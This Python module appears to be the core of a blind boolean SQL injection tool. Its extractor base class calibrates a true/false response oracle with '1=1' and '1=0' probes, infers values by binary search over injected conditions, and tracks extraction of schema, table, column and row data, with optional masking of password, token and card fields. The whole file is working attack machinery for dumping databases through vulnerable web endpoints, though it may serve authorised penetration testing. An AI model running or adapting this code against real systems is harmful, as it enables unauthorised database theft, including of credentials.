from __future__ import annotations

import itertools
import threading
import time
from collections.abc import Iterator
from contextlib import contextmanager
from dataclasses import dataclass

from .client import HttpClient
from .dialects import SqlDialect
from .events import (
    EventCallback,
    EventEmitter,
    ScanControl,
    entity_id,
    relationship_id,
)
from .models import ExtractionJob, ProbeResult
from .oracle import ResponseOracle

MAX_WORKERS = 64
INFERENCE_MODES = {"adaptive", "binary", "bitwise", "turbo"}
MAX_ADAPTIVE_ALPHABET = 512

SENSITIVE_COLUMN_PARTS = {
    "password",
    "passwd",
    "pwd",
    "secret",
    "token",
    "api_key",
    "apikey",
    "session",
    "cookie",
    "authorization",
    "auth",
    "credit_card",
    "card_number",
    "cvv",
    "cvc",
}


def protect_sensitive_value(
    column: str,
    value: str,
    *,
    reveal: bool = False,
) -> str:
    if reveal:
        return value
    normalized = column.casefold().replace("-", "_").replace(" ", "_")
    if not any(part in normalized for part in SENSITIVE_COLUMN_PARTS):
        return value
    if any(part in normalized for part in {"card", "cvv", "cvc"}):
        return "****" + value[-4:] if len(value) > 4 else "****"
    if any(part in normalized for part in {"token", "session", "api", "auth"}):
        return f"{value[:4]}…{value[-4:]}" if len(value) >= 12 else "********"
    return "********"


class CalibrationError(RuntimeError):
    pass


class ExtractionError(RuntimeError):
    pass


@dataclass(slots=True)
class ExtractorConfig:
    workers: int = 4
    max_length: int = 128
    max_items: int = 128
    min_char_code: int = 32
    max_char_code: int = 126

    def __post_init__(self) -> None:
        if not 1 <= self.workers <= MAX_WORKERS:
            raise ValueError(f"workers must be between 1 and {MAX_WORKERS}")
        if self.max_length < 1:
            raise ValueError("max_length must be at least 1")
        if self.max_items < 1:
            raise ValueError("max_items must be at least 1")
        if not 0 <= self.min_char_code <= self.max_char_code <= 0x10FFFF:
            raise ValueError("invalid character code range")


def job_activity(job: object) -> tuple[str, str]:
    if isinstance(job, ExtractionJob):
        expression = job.expression.casefold()
        if "schema_name" in expression or "pragma_database_list" in expression:
            slot = int(job.key) + 1 if job.key.isdigit() else job.key
            return "Extract schema name", f"schema slot {slot}"
        if "table_name" in expression or "sqlite_schema" in expression:
            return "Extract table name", job.key
        if "column_name" in expression or "pragma_table_info" in expression:
            return "Extract column name", job.key
        return "Extract value", job.key
    if isinstance(job, str):
        return "Count tables", job
    if isinstance(job, tuple) and len(job) >= 4:
        return "Count columns", f"{job[2]}.{job[3]}"
    return "Concurrent task", str(job)


class ExtractorBase:
    """HTTP/oracle base with activity, entity and performance instrumentation."""

    def __init__(
        self,
        client: HttpClient,
        oracle: ResponseOracle,
        dialect: SqlDialect,
        config: ExtractorConfig,
        *,
        scan_id: str = "cli",
        event_callback: EventCallback | None = None,
        control: ScanControl | None = None,
        inference_mode: str = "adaptive",
        parallel_characters: bool = True,
        adaptive_confirmation: bool = True,
    ) -> None:
        if inference_mode not in INFERENCE_MODES:
            raise ValueError(
                f"inference_mode must be one of {sorted(INFERENCE_MODES)}"
            )
        self.client = client
        self.oracle = oracle
        self.dialect = dialect
        self.config = config
        self.control = control or ScanControl()
        self.events = EventEmitter(scan_id, event_callback)
        self.inference_mode = inference_mode
        self.parallel_characters = parallel_characters
        self.adaptive_confirmation = adaptive_confirmation
        self._started = time.monotonic()
        self._event_lock = threading.Lock()
        self._activity_counter = itertools.count(1)
        self._activity_lock = threading.Lock()
        self._activity_local = threading.local()
        self._alphabet_lock = threading.Lock()
        self._observed_codes: dict[int, int] = {}
        self._inference_metrics_lock = threading.Lock()
        self._inference_metrics: dict[str, int] = {
            "characters": 0,
            "fallbacks": 0,
            "confirmations": 0,
            "bit_probes": 0,
            "partition_probes": 0,
            "binary_probes": 0,
            "vector_integer_probes": 0,
            "checksum_probes": 0,
            "checksum_fallbacks": 0,
            "batch_confirmations": 0,
        }

    def _emit(self, event_type: str, **payload: object) -> None:
        with self._event_lock:
            self.events.emit(event_type, **payload)

    def _stack(self) -> list[dict[str, object]]:
        value = getattr(self._activity_local, "stack", None)
        if value is None:
            value = []
            self._activity_local.stack = value
        return value

    def _current(self) -> dict[str, object] | None:
        stack = self._stack()
        return stack[-1] if stack else None

    @staticmethod
    def _activity_payload(value: dict[str, object]) -> dict[str, object]:
        return {
            key: item
            for key, item in value.items()
            if not key.startswith("_")
        }

    @contextmanager
    def activity(
        self,
        operation: str,
        target: str,
        *,
        detail: str = "starting",
        kind: str = "extraction",
    ) -> Iterator[None]:
        with self._activity_lock:
            identifier = (
                f"activity:{self.events.scan_id}:{next(self._activity_counter)}"
            )
        started = time.monotonic()
        value: dict[str, object] = {
            "id": identifier,
            "operation": operation,
            "target": target,
            "detail": detail,
            "kind": kind,
            "status": "running",
            "worker": threading.current_thread().name,
            "requests_used": self.client.requests_used,
            "_last": 0.0,
        }
        stack = self._stack()
        stack.append(value)
        self._emit("activity.started", activity=self._activity_payload(value))
        try:
            yield
        except Exception as exc:
            value.update(
                status="failed",
                detail=str(exc)[:240],
                elapsed_seconds=round(time.monotonic() - started, 6),
                requests_used=self.client.requests_used,
            )
            self._emit("activity.failed", activity=self._activity_payload(value))
            raise
        else:
            value.update(
                status="completed",
                elapsed_seconds=round(time.monotonic() - started, 6),
                requests_used=self.client.requests_used,
            )
            self._emit("activity.completed", activity=self._activity_payload(value))
        finally:
            if stack and stack[-1] is value:
                stack.pop()
            elif value in stack:
                stack.remove(value)

    def _activity_update(
        self,
        detail: str,
        *,
        force: bool = False,
        **extra: object,
    ) -> None:
        value = self._current()
        if value is None:
            return
        now = time.monotonic()
        value.update(
            detail=detail,
            requests_used=self.client.requests_used,
            **extra,
        )
        if not force and now - float(value.get("_last", 0.0)) < 0.08:
            return
        value["_last"] = now
        self._emit("activity.updated", activity=self._activity_payload(value))

    def _update_activity(
        self,
        detail: str,
        *,
        force: bool = False,
        **extra: object,
    ) -> None:
        """Compatibility alias for activity-aware callers and tests."""
        self._activity_update(detail, force=force, **extra)

    def _metric(self, name: str, amount: int = 1) -> None:
        with self._inference_metrics_lock:
            self._inference_metrics[name] = (
                self._inference_metrics.get(name, 0) + amount
            )

    def performance_snapshot(self) -> dict[str, object]:
        with self._inference_metrics_lock:
            inference = dict(self._inference_metrics)
        client = (
            self.client.performance_snapshot()
            if hasattr(self.client, "performance_snapshot")
            else {}
        )
        return {
            "inference_mode": self.inference_mode,
            "parallel_characters": self.parallel_characters,
            "inference": inference,
            "http": client,
        }

    def _emit_entity(
        self,
        *,
        kind: str,
        name: str,
        entity_key: tuple[str, ...],
        parent_id: str | None = None,
        status: str = "complete",
        data: dict[str, object] | None = None,
    ) -> str:
        identifier = entity_id(kind, *entity_key)
        self._emit(
            f"{kind}.discovered",
            entity={
                "id": identifier,
                "type": kind,
                "name": name,
                "parent_id": parent_id,
                "status": status,
                "data": data or {},
            },
        )
        if parent_id is not None:
            relation = relationship_id(parent_id, identifier, "contains")
            self._emit(
                "relationship.created",
                relationship={
                    "id": relation,
                    "source_id": parent_id,
                    "target_id": identifier,
                    "kind": "contains",
                },
            )
        return identifier

    def probe_condition(self, condition: str) -> ProbeResult:
        self.control.checkpoint()
        payload = self.dialect.boolean_payload(condition)
        started = time.monotonic()
        response = self.client.get(payload)
        elapsed = time.monotonic() - started
        result = ProbeResult(
            matched=self.oracle.evaluate(response),
            status_code=response.status_code,
            body_length=len(response.content),
            elapsed_seconds=elapsed,
            final_url=response.url,
        )
        self._emit(
            "request.completed",
            matched=result.matched,
            status_code=result.status_code,
            body_length=result.body_length,
            elapsed_seconds=round(result.elapsed_seconds, 6),
            requests_used=self.client.requests_used,
        )
        return result

    def calibrate(self) -> tuple[ProbeResult, ProbeResult]:
        with self.activity(
            "Calibrate oracle",
            "TRUE condition",
            detail="probing 1=1",
            kind="oracle",
        ):
            true_result = self.probe_condition("1=1")
            self._activity_update(
                f"status {true_result.status_code}, "
                f"{true_result.body_length} bytes",
                force=True,
            )
        with self.activity(
            "Calibrate oracle",
            "FALSE condition",
            detail="probing 1=0",
            kind="oracle",
        ):
            false_result = self.probe_condition("1=0")
            self._activity_update(
                f"status {false_result.status_code}, "
                f"{false_result.body_length} bytes",
                force=True,
            )
        if not true_result.matched or false_result.matched:
            raise CalibrationError(
                "Oracle calibration failed. Expected TRUE to match and FALSE "
                "not to match. "
                f"TRUE(status={true_result.status_code}, "
                f"bytes={true_result.body_length}, matched={true_result.matched}); "
                f"FALSE(status={false_result.status_code}, "
                f"bytes={false_result.body_length}, matched={false_result.matched})."
            )
        self._emit(
            "scan.calibrated",
            true_status=true_result.status_code,
            true_bytes=true_result.body_length,
            false_status=false_result.status_code,
            false_bytes=false_result.body_length,
        )
        return true_result, false_result

    def infer_integer(self, expression: str, maximum: int) -> int:
        value, truncated = self.infer_integer_capped(expression, maximum)
        if truncated:
            raise ExtractionError(
                f"Inferred integer exceeds configured maximum ({maximum})."
            )
        return value

    def infer_integer_capped(
        self,
        expression: str,
        maximum: int,
    ) -> tuple[int, bool]:
        """Infer 0..maximum with maximum+1 as a truncation sentinel."""
        if maximum < 0:
            raise ValueError("maximum cannot be negative")
        self._activity_update(
            f"searching integer in range 0..{maximum}",
            maximum=maximum,
        )
        low, high = 0, maximum + 1
        while low < high:
            midpoint = (low + high) // 2
            condition = f"COALESCE(({expression}), 0) > {midpoint}"
            if self.probe_condition(condition).matched:
                low = midpoint + 1
            else:
                high = midpoint
        truncated = low == maximum + 1
        value = maximum if truncated else low
        suffix = " (limit reached)" if truncated else ""
        self._activity_update(
            f"resolved integer: {value}{suffix}",
            force=True,
            current=value,
            maximum=maximum,
        )
        return value, truncated

    def _stable_condition(
        self,
        condition: str,
        *,
        initial: ProbeResult | None = None,
    ) -> tuple[bool, list[ProbeResult]]:
        """Return a two-of-three decision using at least two probes."""
        samples = [initial] if initial is not None else []
        while len(samples) < 2:
            samples.append(self.probe_condition(condition))
        if samples[0].matched == samples[1].matched:
            return samples[0].matched, samples
        samples.append(self.probe_condition(condition))
        matched = sum(1 for sample in samples if sample.matched) >= 2
        return matched, samples

    @property
    def elapsed_seconds(self) -> float:
        return time.monotonic() - self._started
